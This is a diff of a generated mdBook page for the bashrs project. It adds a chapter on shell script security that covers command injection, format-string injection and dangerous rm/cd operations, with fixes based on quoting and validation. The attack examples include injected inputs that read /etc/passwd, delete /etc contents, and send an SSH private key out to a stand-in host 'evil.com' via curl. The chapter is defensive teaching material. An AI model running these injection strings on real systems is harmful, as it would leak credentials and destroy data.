@@ -24,28 +24,41 @@
         <link rel="stylesheet" href="fonts/fonts.css">
 
         <!-- Highlight.js Stylesheets -->
-        <link rel="stylesheet" href="highlight.css">
-        <link rel="stylesheet" href="tomorrow-night.css">
-        <link rel="stylesheet" href="ayu-highlight.css">
+        <link rel="stylesheet" id="highlight-css" href="highlight.css">
+        <link rel="stylesheet" id="tomorrow-night-css" href="tomorrow-night.css">
+        <link rel="stylesheet" id="ayu-highlight-css" href="ayu-highlight.css">
 
         <!-- Custom theme stylesheets -->
 
 
-        <!-- Provide site root to javascript -->
+        <!-- Provide site root and default themes to javascript -->
         <script>
-            var path_to_root = "";
-            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "coal" : "rust";
+            const path_to_root = "";
+            const default_light_theme = "rust";
+            const default_dark_theme = "coal";
+            window.path_to_searchindex_js = "searchindex.js";
         </script>
         <!-- Start loading toc.js asap -->
         <script src="toc.js"></script>
     </head>
     <body>
+    <div id="mdbook-help-container">
+        <div id="mdbook-help-popup">
+            <h2 class="mdbook-help-title">Keyboard shortcuts</h2>
+            <div>
+                <p>Press <kbd>←</kbd> or <kbd>→</kbd> to navigate between chapters</p>
+                <p>Press <kbd>S</kbd> or <kbd>/</kbd> to search in the book</p>
+                <p>Press <kbd>?</kbd> to show this help</p>
+                <p>Press <kbd>Esc</kbd> to hide this help</p>
+            </div>
+        </div>
+    </div>
     <div id="body-container">
         <!-- Work around some values being stored in localStorage wrapped in quotes -->
         <script>
             try {
-                var theme = localStorage.getItem('mdbook-theme');
-                var sidebar = localStorage.getItem('mdbook-sidebar');
+                let theme = localStorage.getItem('mdbook-theme');
+                let sidebar = localStorage.getItem('mdbook-sidebar');
 
                 if (theme.startsWith('"') && theme.endsWith('"')) {
                     localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
@@ -59,7 +72,8 @@
 
         <!-- Set the theme before any content is loaded, prevents flash -->
         <script>
-            var theme;
+            const default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? default_dark_theme : default_light_theme;
+            let theme;
             try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
             if (theme === null || theme === undefined) { theme = default_theme; }
             const html = document.documentElement;
@@ -72,17 +86,20 @@
 
         <!-- Hide / unhide sidebar before it is displayed -->
         <script>
-            var sidebar = null;
-            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            let sidebar = null;
+            const sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
             if (document.body.clientWidth >= 1080) {
                 try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                 sidebar = sidebar || 'visible';
             } else {
                 sidebar = 'hidden';
+                sidebar_toggle.checked = false;
             }
-            sidebar_toggle.checked = sidebar === 'visible';
-            html.classList.remove('sidebar-visible');
-            html.classList.add("sidebar-" + sidebar);
+            if (sidebar === 'visible') {
+                sidebar_toggle.checked = true;
+            } else {
+                html.classList.remove('sidebar-visible');
+            }
         </script>
 
         <nav id="sidebar" class="sidebar" aria-label="Table of contents">
@@ -109,13 +126,14 @@
                             <i class="fa fa-paint-brush"></i>
                         </button>
                         <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="default_theme">Auto</button></li>
                             <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                             <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                             <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                             <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                             <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                         </ul>
-                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                        <button id="search-toggle" class="icon-button" type="button" title="Search (`/`)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="/ s" aria-controls="searchbar">
                             <i class="fa fa-search"></i>
                         </button>
                     </div>
@@ -129,7 +147,7 @@
                         <a href="https://github.com/paiml/bashrs" title="Git repository" aria-label="Git repository">
                             <i id="git-repository-button" class="fa fa-github"></i>
                         </a>
-                        <a href="https://github.com/paiml/bashrs/edit/main/rash-book/src/ch10-security-tdd.md" title="Suggest an edit" aria-label="Suggest an edit">
+                        <a href="https://github.com/paiml/bashrs/edit/main/rash-book/src/ch10-security-tdd.md" title="Suggest an edit" aria-label="Suggest an edit" rel="edit">
                             <i id="git-edit-button" class="fa fa-edit"></i>
                         </a>
 
@@ -138,7 +156,12 @@
 
                 <div id="search-wrapper" class="hidden">
                     <form id="searchbar-outer" class="searchbar-outer">
-                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                        <div class="search-wrapper">
+                            <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                            <div class="spinner-wrapper">
+                                <i class="fa fa-spinner fa-spin"></i>
+                            </div>
+                        </div>
                     </form>
                     <div id="searchresults-outer" class="searchresults-outer hidden">
                         <div id="searchresults-header" class="searchresults-header"></div>
@@ -158,7 +181,190 @@
 
                 <div id="content" class="content">
                     <main>
-                        <h1 id="placeholder-ch10-security-tddmd"><a class="header" href="#placeholder-ch10-security-tddmd">Placeholder: ch10-security-tdd.md</a></h1>
+                        <h1 id="chapter-10-security-and-injection-prevention"><a class="header" href="#chapter-10-security-and-injection-prevention">Chapter 10: Security and Injection Prevention</a></h1>
+<p>Shell scripts are the glue of production infrastructure, yet they’re among the most vulnerable to security exploits. A single unquoted variable or format string injection can escalate into complete system compromise. This chapter covers how bashrs helps prevent common shell security vulnerabilities.</p>
+<h2 id="why-shell-security-matters"><a class="header" href="#why-shell-security-matters">Why Shell Security Matters</a></h2>
+<p><strong>Real-world incident</strong>: A production deployment script with an unquoted variable allowed an attacker to inject commands, leading to data exfiltration.</p>
+<pre><code class="language-bash"># VULNERABLE CODE (production script)
+FILENAME=$1  # User input
+rm /tmp/$FILENAME  # ❌ Command injection!
+</code></pre>
+<p><strong>Attack</strong>:</p>
+<pre><code class="language-bash">$ ./cleanup.sh "test.txt; cat /etc/passwd &gt; /tmp/stolen"
+# Executes: rm /tmp/test.txt; cat /etc/passwd &gt; /tmp/stolen
+</code></pre>
+<h3 id="common-shell-vulnerabilities"><a class="header" href="#common-shell-vulnerabilities">Common Shell Vulnerabilities</a></h3>
+<ol>
+<li><strong>Command Injection</strong>: Unquoted variables allowing arbitrary command execution</li>
+<li><strong>Format String Injection</strong>: Variables in printf format strings</li>
+<li><strong>Path Traversal</strong>: Unvalidated file paths accessing sensitive files</li>
+<li><strong>Dangerous Operations</strong>: Unprotected rm -rf / chmod 777</li>
+<li><strong>Information Disclosure</strong>: Secrets in scripts or logs</li>
+</ol>
+<h2 id="how-bashrs-prevents-security-issues"><a class="header" href="#how-bashrs-prevents-security-issues">How Bashrs Prevents Security Issues</a></h2>
+<p>Bashrs provides <strong>defense in depth</strong> through multiple layers:</p>
+<ol>
+<li><strong>Static Analysis</strong>: Linter catches dangerous patterns before execution</li>
+<li><strong>Automatic Quoting</strong>: Transpiler adds quotes where needed</li>
+<li><strong>Type Safety</strong>: Rust’s type system prevents many injection classes</li>
+<li><strong>Validation</strong>: AST validates all constructs before generation</li>
+</ol>
+<hr />
+<h2 id="command-injection-prevention"><a class="header" href="#command-injection-prevention">Command Injection Prevention</a></h2>
+<h3 id="the-attack-surface"><a class="header" href="#the-attack-surface">The Attack Surface</a></h3>
+<p>Command injection occurs when untrusted input is used in shell commands without proper quoting:</p>
+<pre><code class="language-bash"># VULNERABLE: Unquoted user input
+USER_FILE=$1
+cat $USER_FILE  # ❌ Injection point!
+</code></pre>
+<p><strong>Exploitation</strong>:</p>
+<pre><code class="language-bash">$ ./view.sh "/etc/passwd; curl evil.com/exfiltrate?data=$(cat ~/.ssh/id_rsa)"
+# Executes BOTH commands!
+</code></pre>
+<h3 id="sc2086-the-most-critical-rule"><a class="header" href="#sc2086-the-most-critical-rule">SC2086: The Most Critical Rule</a></h3>
+<p><strong>Rule</strong>: Double quote to prevent globbing and word splitting</p>
+<p><strong>Example Vulnerability</strong>:</p>
+<pre><code class="language-bash">#!/bin/bash
+# cleanup.sh - DANGEROUS
+TARGET_DIR=$1
+rm -rf $TARGET_DIR/*  # ❌ CRITICAL VULNERABILITY
+</code></pre>
+<p><strong>Attack</strong>:</p>
+<pre><code class="language-bash">$ ./cleanup.sh "/tmp/test /etc"
+# Expands to: rm -rf /tmp/test /etc/*
+# DELETES /etc CONTENTS!
+</code></pre>
+<h3 id="bashrs-protection"><a class="header" href="#bashrs-protection">Bashrs Protection</a></h3>
+<p><strong>Rust Version</strong> (Type-Safe):</p>
+<pre><code class="language-rust">// cleanup.rs - SAFE
+fn cleanup(target_dir: &amp;str) -&gt; Result&lt;(), String&gt; {
+    // Rust's type system prevents many injection classes
+    let target_path = Path::new(target_dir);
+
+    // Validate path before use
+    if !target_path.starts_with("/tmp/") {
+        return Err("Invalid path: must be in /tmp/".to_string());
+    }
+
+    std::fs::remove_dir_all(target_path)
+        .map_err(|e| format!("Failed to remove: {}", e))
+}</code></pre>
+<p><strong>Generated Shell</strong> (Quoted):</p>
+<pre><code class="language-sh">#!/bin/sh
+# Generated by bashrs - ALL VARIABLES QUOTED
+
+cleanup() {
+    target_dir="$1"
+
+    # ✅ Properly quoted - safe from injection
+    rm -rf "${target_dir:?}/"  # :? fails if unset
+}
+</code></pre>
+<h3 id="quoting-rules"><a class="header" href="#quoting-rules">Quoting Rules</a></h3>
+<div class="table-wrapper"><table><thead><tr><th>Pattern</th><th>Vulnerable</th><th>Safe</th><th>Detection</th></tr></thead><tbody>
+<tr><td><code>rm $file</code></td><td>❌</td><td><code>rm "$file"</code></td><td>SC2086</td></tr>
+<tr><td><code>cat $1 $2</code></td><td>❌</td><td><code>cat "$1" "$2"</code></td><td>SC2086</td></tr>
+<tr><td><code>cd $DIR</code></td><td>❌</td><td><code>cd "$DIR"</code></td><td>SC2086</td></tr>
+<tr><td><code>$(cmd $var)</code></td><td>❌</td><td><code>"$(cmd "$var")"</code></td><td>SC2046</td></tr>
+</tbody></table>
+</div>
+<hr />
+<h2 id="format-string-injection-sc2059"><a class="header" href="#format-string-injection-sc2059">Format String Injection (SC2059)</a></h2>
+<h3 id="the-vulnerability"><a class="header" href="#the-vulnerability">The Vulnerability</a></h3>
+<p>Using variables in printf format strings allows format string injection:</p>
+<pre><code class="language-bash"># VULNERABLE: Variable as format string
+MESSAGE=$1
+printf "$MESSAGE"  # ❌ Format string injection!
+</code></pre>
+<p><strong>Attack</strong>:</p>
+<pre><code class="language-bash">$ ./log.sh "%s%s%s%s%s%s%s%s%s%s"
+# Crashes or leaks memory contents
+</code></pre>
+<h3 id="the-fix"><a class="header" href="#the-fix">The Fix</a></h3>
+<p>Always use literal format strings with %s for variables:</p>
+<pre><code class="language-bash"># SAFE: Literal format string
+MESSAGE=$1
+printf '%s\n' "$MESSAGE"  # ✅ Safe!
+</code></pre>
+<h3 id="bashrs-protection-1"><a class="header" href="#bashrs-protection-1">Bashrs Protection</a></h3>
+<pre><code class="language-rust">// Rust version - type safe
+fn log_message(msg: &amp;str) {
+    println!("{}", msg);  // Safe - no format string vuln
+}</code></pre>
+<p>Generates:</p>
+<pre><code class="language-sh">log_message() {
+    printf '%s\n' "$1"  # ✅ Always literal format
+}
+</code></pre>
+<hr />
+<h2 id="dangerous-operations"><a class="header" href="#dangerous-operations">Dangerous Operations</a></h2>
+<h3 id="sc2115-protect-against-rm--rf-"><a class="header" href="#sc2115-protect-against-rm--rf-">SC2115: Protect Against rm -rf /</a></h3>
+<p><strong>Vulnerability</strong>:</p>
+<pre><code class="language-bash">PROJECT_DIR=""  # Oops, unset!
+rm -rf "$PROJECT_DIR/"  # Becomes: rm -rf /
+# DELETES ENTIRE SYSTEM!
+</code></pre>
+<p><strong>Protection</strong>:</p>
+<pre><code class="language-bash"># Use :? to fail if unset
+rm -rf "${PROJECT_DIR:?}/"  # ✅ Exits with error if unset
+</code></pre>
+<h3 id="sc2164-always-check-cd"><a class="header" href="#sc2164-always-check-cd">SC2164: Always Check cd</a></h3>
+<p><strong>Vulnerability</strong>:</p>
+<pre><code class="language-bash">cd "$PROJECT_DIR"
+rm -rf *  # If cd failed, runs in wrong directory!
+</code></pre>
+<p><strong>Protection</strong>:</p>
+<pre><code class="language-bash">cd "$PROJECT_DIR" || exit 1  # ✅ Exit if cd fails
+rm -rf *  # Only runs if cd succeeded
+</code></pre>
+<h2 id="security-best-practices"><a class="header" href="#security-best-practices">Security Best Practices</a></h2>
+<h3 id="1-input-validation"><a class="header" href="#1-input-validation">1. Input Validation</a></h3>
+<pre><code class="language-rust">fn validate_filename(name: &amp;str) -&gt; Result&lt;(), String&gt; {
+    // Allow only alphanumeric, dash, underscore
+    if !name.chars().all(|c| c.is_alphanumeric() || c == '-' || c == '_') {
+        return Err("Invalid filename".to_string());
+    }
+    Ok(())
+}</code></pre>
+<h3 id="2-path-restrictions"><a class="header" href="#2-path-restrictions">2. Path Restrictions</a></h3>
+<pre><code class="language-rust">fn validate_path(path: &amp;Path) -&gt; Result&lt;(), String&gt; {
+    // Must be within allowed directory
+    if !path.starts_with("/tmp/app/") {
+        return Err("Path outside allowed directory".to_string());
+    }
+    Ok(())
+}</code></pre>
+<h3 id="3-least-privilege"><a class="header" href="#3-least-privilege">3. Least Privilege</a></h3>
+<pre><code class="language-bash"># Set restrictive permissions
+chmod 750 /app/config  # rwxr-x---, not 777
+</code></pre>
+<h3 id="4-no-secrets-in-scripts"><a class="header" href="#4-no-secrets-in-scripts">4. No Secrets in Scripts</a></h3>
+<pre><code class="language-rust">// ❌ NEVER hardcode secrets
+const API_KEY: &amp;str = "secret123";  // VULNERABLE!
+
+// ✅ Use environment variables
+fn get_api_key() -&gt; Result&lt;String, String&gt; {
+    std::env::var("API_KEY")
+        .map_err(|_| "API_KEY not set".to_string())
+}</code></pre>
+<h2 id="summary"><a class="header" href="#summary">Summary</a></h2>
+<p><strong>Security Layers in Bashrs</strong>:</p>
+<div class="table-wrapper"><table><thead><tr><th>Layer</th><th>Protection</th><th>Rules</th></tr></thead><tbody>
+<tr><td><strong>Linting</strong></td><td>Static analysis</td><td>SC2086, SC2046, SC2059, SC2115, SC2164</td></tr>
+<tr><td><strong>Quoting</strong></td><td>Auto-quote variables</td><td>All variables quoted in output</td></tr>
+<tr><td><strong>Type Safety</strong></td><td>Rust types</td><td>Prevents many injection classes</td></tr>
+<tr><td><strong>Validation</strong></td><td>Path/input checks</td><td>Whitelist allowed patterns</td></tr>
+</tbody></table>
+</div>
+<p><strong>Key Takeaways</strong>:</p>
+<ol>
+<li><strong>Always quote variables</strong> - SC2086 is the #1 security rule</li>
+<li><strong>Use literal format strings</strong> - Never <code>printf "$var"</code></li>
+<li><strong>Validate all input</strong> - Whitelist, don’t blacklist</li>
+<li><strong>Check command failures</strong> - <code>cd ... || exit</code></li>
+<li><strong>Protect dangerous operations</strong> - <code>${VAR:?}</code> for required variables</li>
+</ol>
+<p><strong>Next chapter</strong>: <a href="ch11-bootstrap-tdd.html">Chapter 11: Bootstrap Installers →</a></p>
 
                     </main>
 
@@ -200,8 +406,8 @@
         </script>
 
         <script src="ace.js"></script>
-        <script src="editor.js"></script>
         <script src="mode-rust.js"></script>
+        <script src="editor.js"></script>
         <script src="theme-dawn.js"></script>
         <script src="theme-tomorrow_night.js"></script>
 
@@ -214,6 +420,7 @@
         <script src="book.js"></script>
 
         <!-- Custom JS scripts -->
+
 
 
     </div>
